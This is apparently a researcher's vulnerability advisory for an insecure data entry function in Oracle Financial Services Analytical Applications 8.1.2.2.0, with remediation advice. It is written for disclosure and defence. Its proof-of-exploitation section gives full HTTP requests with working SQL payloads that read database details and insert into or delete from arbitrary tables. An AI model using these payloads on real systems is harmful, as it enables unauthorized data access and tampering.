# Oracle Financial Services Analytical Applications - Insecure Design Data Entry Function

**Vendors:** Oracle ([https://www.oracle.com/](https://www.oracle.com/))
**Product:** Oracle Financial Services Analytical Applications ([https://www.oracle.com/financial-services/analytics/](https://www.oracle.com/financial-services/analytics/)) - Modules Asset Liability Management
**Version:** 8.1.2.2.0
**Discovered by:** Le Quoc Bao, Nguyen Quoc Viet, Vy Tien Dat - HPT Vietnam Corporation

## **Description:**
Oracle Financial Services Analytical Applications Version 8.1.2.2.0 is vulnerable to Insecure Design Function. The design of function is not secure allowing users to customize database queries directly within the application is a significant security vulnerability. This design flaw enables users to manipulate queries and access sensitive data beyond the intended scope. By modifying pre-defined queries, attackers can potentially exploit **INSERT INTO, DELETE** statements to **select**, **insert** or **delete** data from unrelated tables, such as extracting user credentials, including passwords, across the entire application. Additionally, this vulnerability may allow attackers to bypass SQL injection protection mechanisms, leading to privileges escalation or unauthorized data access. In some cases, it could even result in the exploitation of the application server itself, causing severe security breaches.
*   **Vulnerable parameter**: `sqlString`
*   **Function**:
\- Asset Liability Management > Common Object Maintenance > Data Entry Forms and Queries > Data Entry > Edit Data Entry Rows
\- Asset Liability Management > Common Object Maintenance > Data Entry Forms and Queries > Data Entry > Add Data Entry Rows
\- Asset Liability Management > Common Object Maintenance > Data Entry Forms and Queries > Data Entry > Delete Data Entry Rows
*   **URL**: http://**\[yourdomain\]**/**\[APIHOST\]**/DeFi/DataEntry/DisplayPage.jsp
*   **Method**: POST
*   **Payload**: any SQL query
*   **Conditional**: User Login
*   **Vulnerable / Tested Versions:**
The following version has been tested which was the most recent one when the vulnerabilities were discovered:
Oracle Financial Services Analytical Applications Version 8.1.2.2.0
## **Severity:**
9.1 / Critical - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
## Remediation:
**\- Avoid Direct Query Customization by Users:**
*   Do not allow users to create or modify database queries directly.
*   Implement pre-defined, parameterized queries or stored procedures to handle user input safely.
\- **Restrict Dynamic Queries:**
*   Avoid using dynamically constructed SQL queries based on user input. If dynamic queries are unavoidable, thoroughly validate inputs and use query parameterization
\- **Regular Security Testing:**
*   Conduct regular security assessments, including penetration testing, to identify and remediate vulnerabilities.
## Proof of Exploitation:
1. Login to user have granted privileges to using **Asset Liability Management** and able to modify Data Entry
![](https://t3897127.p.clickup-attachments.com/t3897127/d80b05dd-3d61-4ed8-931a-ca675ef08182/image.png)
*   Asset Liability Management
![](https://t3897127.p.clickup-attachments.com/t3897127/1e7e6b65-e515-4382-a58b-d8cdbdac5efd/image.png)
*   Common Object Maintenance
![](https://t3897127.p.clickup-attachments.com/t3897127/501b9ea8-7e8e-4e96-8bdc-806c0c2c3fb9/image.png)
*   Data Entry Forms and Queries
![](https://t3897127.p.clickup-attachments.com/t3897127/09f29195-d6dc-4e66-8368-d5e3cb0df8b2/image.png)
*   Data Entry :
![](https://t3897127.p.clickup-attachments.com/t3897127/ef464fd2-8d7c-451b-8055-2cc5733046b8/image.png)
*   Edit Data Entry:
![](https://t3897127.p.clickup-attachments.com/t3897127/47d973ed-73da-466e-9247-9085fba857cd/image.png)
*   Add Data Entry:
![](https://t3897127.p.clickup-attachments.com/t3897127/0a83ff15-1e3d-4207-9840-2677a7424097/image.png)
*   Delete Data Entry:
![](https://t3897127.p.clickup-attachments.com/t3897127/cb3c5be7-8387-4f07-ac44-1e71aa646186/image.png)
2\. Choose Edit button and modify one of the Rows in list and then clicking to Save to insert updated data to database.
![](https://t3897127.p.clickup-attachments.com/t3897127/78ed9e30-185d-421e-bfa2-34808ef2eef0/image.png)
*   Save button.
![](https://t3897127.p.clickup-attachments.com/t3897127/a9c1a599-1d26-467c-9ae9-eb0ffc27658b/image.png)
3\. We using Burp Suite here to intercept the request. HTTP Request send when Save edit rows:
![](https://t3897127.p.clickup-attachments.com/t3897127/2b61e69a-1444-470b-b81b-715198c53f90/image.png)
3\. Send request to Repeater Tab and send, this is normal HTTP Request when save edit rows, we can see value of `sqlString` is **INSERT INTO** SQL query using for update data to databases. By design it just using **INSERT INTO** pre-queries to update data.
![](https://t3897127.p.clickup-attachments.com/t3897127/d0cc2c3d-9e03-4deb-9c8d-fd47e35697db/image.png)
4\. Inject SQL query payload to VALUES of **INSERT INTO** query which values we want to extract from databases. Here we want to get current user so payload is `(select user from dual)` , inject payload into **V\_EXCEL\_NAME** columns of table **IMP\_PERCENT\_CF** via sqlString parameter.
![](https://t3897127.p.clickup-attachments.com/t3897127/988e955b-fa64-4a51-9a99-e5bf2f197fd0/image.png)
*   Details of HTTP Request/Response:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 897
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=LN5W5ga1ABdkjZ-hObRpfp5fTi9gPgsbkKiHF5sEI4nr7a2F9W8N!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=2&rows=1%2C100&requestType=8&seqGenCols=-1&filter=&methodtype=NA&sort=&rownumStr=0&sqlString=0x12+IMP_PERCENT_CF+SET+V_PROD_CODE%3d'A10',N_PERCENT%3d23,D_EFFECTIVE_DATE%3dTO_DATE('11/03/2024','MM/DD/YYYY+HH24%3aMI%3aSS'),V_EXCEL_NAME%3d(select+user+from+dual),V_CREATED_BY%3d'ALMUSER',D_CREATED_DATE%3dsysdate,F_AUTH_FLAG%3d'U'+where+ID%3d2+&recorddetails=&uniqueid=1732332047069&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=11&pagination=true&searchFlag=false&authFlag=true&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Sat, 23 Nov 2024 03:41:53 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0000c6b7
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47514

<HTML Content>
```

5\. When inject, reload page and go to Data Entry again to see result of payload we just inject into database. Current user is **ICAAPATM**
![](https://t3897127.p.clickup-attachments.com/t3897127/10399ad9-a12f-4a68-8d3f-b37e721d9ba9/image.png)
6\. Inject SQL query payload to **V\_EXCEL\_NAME** columns get database version `select banner from v$version` . Length of banner values is 70 and length of **V\_EXCEL\_NAME** just 50, so it's return error message from database.
![](https://t3897127.p.clickup-attachments.com/t3897127/5f2fd982-32c1-452c-ad98-59b4bd1c5b07/image.png)
*   Details of HTTP Request/Response:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 907
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/icaap/DeFi/DataEntry/DisplayPage.jsp
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=LN5W5ga1ABdkjZ-hObRpfp5fTi9gPgsbkKiHF5sEI4nr7a2F9W8N!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=2&rows=1%2C100&requestType=8&seqGenCols=-1&filter=&methodtype=NA&sort=&rownumStr=0&sqlString=0x12+IMP_PERCENT_CF+SET+V_PROD_CODE%3d'A10',N_PERCENT%3d23,D_EFFECTIVE_DATE%3dTO_DATE('11/03/2024','MM/DD/YYYY+HH24%3aMI%3aSS'),V_EXCEL_NAME%3d(SELECT+BANNER+FROM+V$VERSION),V_CREATED_BY%3d'VIETNQ_HPT',D_CREATED_DATE%3dsysdate,F_AUTH_FLAG%3d'U'+where+ID%3d2+&recorddetails=&uniqueid=1732332047069&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=11&pagination=true&searchFlag=false&authFlag=true&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Sat, 23 Nov 2024 04:02:29 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0000ce90
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47691

<HTML Content>
		var saveRslt=[[-1],[ [-1],[0,0],[-1],[["[DeFi] Exception "],["12899","ORA-12899: value too large for column \"ICAAPATM\".\"IMP_PERCENT_CF\".\"V_EXCEL_NAME\" (actual: 70, maximum: 50) "]]]];
```

7\. Using **SUBSTR** function to get first 50 character of banner values, and inject payload to another columns to get next 20 character.
![](https://t3897127.p.clickup-attachments.com/t3897127/3b85721d-bffe-4b25-849f-2784f6677e81/image.png)
*   Version of database: Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
![](https://t3897127.p.clickup-attachments.com/t3897127/7dbba169-d659-4469-bdb3-24840f803d2e/image.png)
*   Details of HTTP Request/Response:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 952
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=LN5W5ga1ABdkjZ-hObRpfp5fTi9gPgsbkKiHF5sEI4nr7a2F9W8N!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=2&rows=1%2C100&requestType=8&seqGenCols=-1&filter=&methodtype=NA&sort=&rownumStr=0&sqlString=0x12+IMP_PERCENT_CF+SET+V_PROD_CODE%3d'A10',N_PERCENT%3d23,D_EFFECTIVE_DATE%3dTO_DATE('11/03/2024','MM/DD/YYYY+HH24%3aMI%3aSS'),V_EXCEL_NAME%3dSUBSTR((SELECT+BANNER+FROM+V$VERSION),1,50),V_CREATED_BY%3dSUBSTR((SELECT+BANNER+FROM+V$VERSION),51,20),D_CREATED_DATE%3dsysdate,F_AUTH_FLAG%3d'U'+where+ID%3d2+&recorddetails=&uniqueid=1732332047069&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=11&pagination=true&searchFlag=false&authFlag=true&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Sat, 23 Nov 2024 04:09:07 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0000d017
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47544

<HTML Content>
```

8\. Add Data Entry, inject payload `(select user from dual)`
![](https://t3897127.p.clickup-attachments.com/t3897127/1e868e25-866f-412a-bb77-a04d23ec9dc9/image.png)
*   V\_CREATED\_BY => Current user **ICAAPATM**
![](https://t3897127.p.clickup-attachments.com/t3897127/ce28f816-4f97-4baf-8d4d-2ef70ea11998/image.png)
*   Details of HTTP Request/Response:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 854
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=181&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=LN5W5ga1ABdkjZ-hObRpfp5fTi9gPgsbkKiHF5sEI4nr7a2F9W8N!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=Normal&rows=5&requestType=7&seqGenCols=-1&filter=null&methodtype=NA&sort=&rownumStr=0&sqlString=0x14IMP_PERCENT_CF(V_PROD_CODE,N_PERCENT,D_EFFECTIVE_DATE,V_CREATED_BY,D_CREATED_DATE,F_AUTH_FLAG)+VALUES+('430',22,TO_DATE('11/20/2024','MM/DD/YYYY+HH24%3aMI%3aSS'),(select+user+from+dual),sysdate,'U')&recorddetails=&uniqueid=1732336028218&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=12&pagination=true&searchFlag=false&authFlag=true&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Sat, 23 Nov 2024 04:39:06 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0000d794
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47468

<HTML Content>
```

9\. Insert values ​​into any table even if they are not in the data entry list
*   Data Entry list (Table name)
![](https://t3897127.p.clickup-attachments.com/t3897127/52131a9f-7d4e-4bef-bca8-19993fd2d5fb/image.png)
*   Click **Add** and change values of `sqlString`parameter to Insert values to tables **TMP\_TEST\_MMG** with SQL query `0x14TMP_TEST_MMG+(ID,+VALUE)+VALUES(0,+'HPT_TEST')`
![](https://t3897127.p.clickup-attachments.com/t3897127/3641af8b-c72e-4cd8-8b85-be3e90d7f91f/image.png)
*   Query in database to confirm inserted success to **TMP\_TEST\_MMG**
![](https://t3897127.p.clickup-attachments.com/t3897127/8efe5cff-6417-43b4-9d82-93333e6b9201/image.png)
*   Details of HTTP Request/Response:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 593
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=169&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=LN5W5ga1ABdkjZ-hObRpfp5fTi9gPgsbkKiHF5sEI4nr7a2F9W8N!416272305
Connection: close

formname=IMP_PRODUCTS_HIERACHY&formIdentifier=169&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=Normal&rows=7&requestType=7&seqGenCols=-1&filter=null&methodtype=NA&sort=&rownumStr=0&sqlString=0x14TMP_TEST_MMG+(ID,+VALUE)+VALUES(0,+'HPT_TEST')&recorddetails=&uniqueid=1732337007059&table_name=IMP_PRODUCTS_HIERACHY&startPageRow=0&recordSize=7&totRecords=200&pagination=true&searchFlag=false&authFlag=true&TreeType=0&searchMsg=null&strExcelNames=%5B%22No+Excel+Files%22%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=F&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Sat, 23 Nov 2024 05:55:42 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0000eab6
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47269

<HTML Content>
```

10\. Delete values ​​from any table even if they are not in the data entry list
*   Choose one rows, click Delete and change values of `sqlString`parameter to delete rows from tables **TMP\_TEST\_MMG** with SQL query `0x13+TMP_TEST_MMG+where+ID%3D0+`
![](https://t3897127.p.clickup-attachments.com/t3897127/2915cf84-5b1d-4f18-b7bc-63860ae1ea45/image.png)
*   Query in database to confirm deleted success rows have ID=0 in table **TMP\_TEST\_MMG**
![](https://t3897127.p.clickup-attachments.com/t3897127/7cd438d1-eb70-4ece-9b07-41713f20185a/image.png)
*   Details of HTTP Request/Response:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 683
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=181&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=LN5W5ga1ABdkjZ-hObRpfp5fTi9gPgsbkKiHF5sEI4nr7a2F9W8N!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=Normal&rows=5&requestType=8&seqGenCols=-1&filter=null&methodtype=NA&sort=&rownumStr=0&sqlString=0x13+TMP_TEST_MMG+where+ID%3D0+&recorddetails=&uniqueid=1732337600967&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=12&pagination=true&searchFlag=false&authFlag=true&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Sat, 23 Nov 2024 06:11:13 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0000ef81
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47468

<HTML Content>
```